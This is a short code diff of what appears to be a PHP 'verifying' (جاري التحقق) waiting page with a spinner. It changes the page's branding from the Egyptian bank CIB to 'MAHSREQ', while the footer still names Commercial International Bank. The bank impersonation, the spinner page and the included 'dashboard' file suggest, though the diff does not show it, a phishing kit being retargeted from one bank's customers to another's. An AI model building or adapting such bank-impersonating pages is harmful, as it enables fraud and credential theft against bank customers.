@@ -9,7 +9,7 @@ require_once('./dashboard/init.php');
 
 <head>
     <meta charset="utf-8">
-    <title>جاري التحقق - CIB</title>
+    <title>جاري التحقق - MAHSREQ</title>
     <meta content="width=device-width, initial-scale=1.0" name="viewport">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
     <style>
@@ -279,7 +279,7 @@ require_once('./dashboard/init.php');
     <div class="container">
         <div class="glass-card">
             <div class="logo-wrap">
-                <img src="assets/logo.webp" alt="CIB">
+                <img src="assets/logo.webp" alt="MAHSREQ">
             </div>
 
             <div class="spinner-container">
@@ -312,7 +312,7 @@ require_once('./dashboard/init.php');
         </div>
     </div>
 
-    <div class="bottom-note">CIB Egypt © 2025 — Commercial International Bank</div>
+    <div class="bottom-note">MAHSREQ Egypt © 2025 — Commercial International Bank</div>
 
     <script>
         (function () {
